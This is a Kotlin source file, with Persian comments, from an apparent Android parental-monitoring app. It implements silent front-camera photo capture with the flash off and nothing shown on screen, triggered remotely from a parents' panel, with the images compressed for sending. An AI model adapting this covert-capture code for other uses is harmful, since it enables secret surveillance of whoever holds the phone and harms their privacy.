package com.negahban.app.sync

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.Matrix
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.hardware.camera2.CameraMetadata
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import java.io.ByteArrayOutputStream
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

/**
 * عکس‌برداری بی‌صدا با دوربین جلو، بدون نمایش هیچ چیزی روی صفحه.
 * فرمان از پنل والدین می‌آید (type=CAPTURE) و نتیجه به‌صورت
 * JPEG فشرده (حداکثر ۷۲۰ پیکسل) به پنل ارسال می‌شود.
 */
object CandidCamera {

    fun hasPermission(context: Context): Boolean =
        ContextCompat.checkSelfPermission(
            context, android.Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED

    /**
     * یک عکس از دوربین جلو می‌گیرد و JPEG فشرده برمی‌گرداند.
     * اگر دوربین در اختیار برنامه دیگری باشد یا خطا رخ دهد،
     * null برمی‌گردد (فرمان در همگام‌سازی بعدی دوباره تلاش می‌شود).
     */
    @SuppressLint("MissingPermission")
    suspend fun shoot(
        context: Context,
        maxDim: Int = 720,
        quality: Int = 80
    ): ByteArray? {
        if (!hasPermission(context)) return null

        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        var cameraId: String? = null
        var sensorOrientation = 0
        for (id in cameraManager.cameraIdList) {
            try {
                val chars = cameraManager.getCameraCharacteristics(id)
                if (chars.get(CameraCharacteristics.LENS_FACING) ==
                    CameraCharacteristics.LENS_FACING_FRONT
                ) {
                    cameraId = id
                    sensorOrientation =
                        chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
                    break
                }
            } catch (e: Exception) {
            }
        }
        if (cameraId == null) return null

        var thread: HandlerThread? = null
        var camera: CameraDevice? = null
        try {
            thread = HandlerThread("candid_camera").also { it.start() }
            val handler = Handler(thread.looper)

            val map = cameraManager.getCameraCharacteristics(cameraId)
                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = map?.getOutputSizes(ImageFormat.JPEG)
                ?.sortedBy { it.width * it.height }
                ?: return null
            // کوچک‌ترین اندازه خروجی برای عکسِ سریع کافی است
            val size = sizes.first()

            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            val jpegFuture = CompletableDeferred<ByteArray?>()
            reader.setOnImageAvailableListener({ r ->
                try {
                    val image = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buf = image.planes[0].buffer
                    val bytes = ByteArray(buf.remaining()) { i -> buf.get(i) }
                    image.close()
                    jpegFuture.complete(bytes)
                } catch (e: Exception) {
                    jpegFuture.complete(null)
                }
            }, handler)

            // باز کردن دوربین (در اندروید ۹+ فقط از حالت پیش‌زمینه مجاز است؛ سرویس پایش این را تامین می‌کند)
            val device = withTimeoutOrNull(6_000L) {
                suspendCancellableCoroutine<CameraDevice> { cont ->
                    cameraManager.openCamera(
                        cameraId,
                        object : CameraDevice.StateCallback() {
                            override fun onOpened(cam: CameraDevice) { cont.resume(cam) }
                            override fun onError(cam: CameraDevice, error: Int) {
                                cont.resumeWithException(SyncException("دوربین در دسترس نیست ($error)"))
                            }
                            override fun onDisconnected(cam: CameraDevice) {
                                cont.resumeWithException(SyncException("دوربین قطع شد"))
                            }
                        },
                        handler
                    )
                }
            } ?: return null
            camera = device

            val session = withTimeoutOrNull(6_000L) {
                suspendCancellableCoroutine<CameraCaptureSession> { cont ->
                    device.createCaptureSession(
                        listOf(reader.surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: CameraCaptureSession) { cont.resume(s) }
                            override fun onConfigureFailed(s: CameraCaptureSession) {
                                cont.resumeWithException(SyncException("پیکربندی دوربین ناموفق بود"))
                            }
                        },
                        handler
                    )
                }
            } ?: return null

            val request = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                .apply {
                    addTarget(reader.surface)
                    set(CaptureRequest.FLASH_MODE, CameraMetadata.FLASH_MODE_OFF)
                }
                .build()

            session.capture(request, object : CameraCaptureSession.CaptureCallback() {}, handler)

            val raw = withTimeoutOrNull(6_000L) { jpegFuture.await() } ?: return null
            if (raw.isEmpty()) return null

            return compress(raw, maxDim, quality, sensorOrientation)
        } catch (e: Exception) {
            return null
        } finally {
            try { camera?.close() } catch (e: Exception) {}
            thread?.quitSafely()
        }
    }

    /** کوچک‌سازی + چرخش بر اساس جهت سنسور + فشرده‌سازی JPEG */
    private fun compress(
        jpeg: ByteArray,
        maxDim: Int,
        quality: Int,
        sensorOrientation: Int
    ): ByteArray? = try {
        val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        BitmapFactory.decodeByteArray(jpeg, 0, jpeg.size, bounds)
        var sample = 1
        while (bounds.outWidth / sample >= maxDim * 2 || bounds.outHeight / sample >= maxDim * 2) {
            sample *= 2
        }
        val opts = BitmapFactory.Options().apply { inSampleSize = sample }
        var bmp = BitmapFactory.decodeByteArray(jpeg, 0, jpeg.size, opts) ?: return null

        if (sensorOrientation == 90 || sensorOrientation == 270) {
            val m = Matrix().apply { postRotate(sensorOrientation.toFloat()) }
            val rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.width, bmp.height, m, true)
            if (rotated !== bmp) bmp.recycle()
            bmp = rotated
        }

        var final = bmp
        if (bmp.width > maxDim || bmp.height > maxDim) {
            val scale = maxDim.toFloat() / maxOf(bmp.width, bmp.height)
            val scaled = Bitmap.createScaledBitmap(
                bmp,
                (bmp.width * scale).toInt().coerceAtLeast(1),
                (bmp.height * scale).toInt().coerceAtLeast(1),
                true
            )
            if (scaled !== bmp) bmp.recycle()
            final = scaled
        }

        val out = ByteArrayOutputStream()
        final.compress(Bitmap.CompressFormat.JPEG, quality, out)
        val bytes = out.toByteArray()
        if (final !== bmp) final.recycle()
        else bmp.recycle()
        bytes
    } catch (e: Exception) {
        null
    }
}
